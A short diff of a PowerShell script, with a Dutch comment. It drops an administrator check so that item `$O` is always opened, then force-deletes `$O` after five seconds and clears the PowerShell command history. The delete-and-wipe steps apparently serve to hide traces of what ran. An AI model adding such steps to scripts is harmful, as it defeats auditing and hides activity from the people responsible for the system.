@@ -20,7 +20,9 @@ foreach ($I in $P) {
     }
 }
 
-if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-} else {
-    Invoke-Item $O
-}
+Invoke-Item $O
+Start-Sleep -Seconds 5
+Remove-Item $O -Force
+
+# Wist de PowerShell geschiedenis
+Clear-History
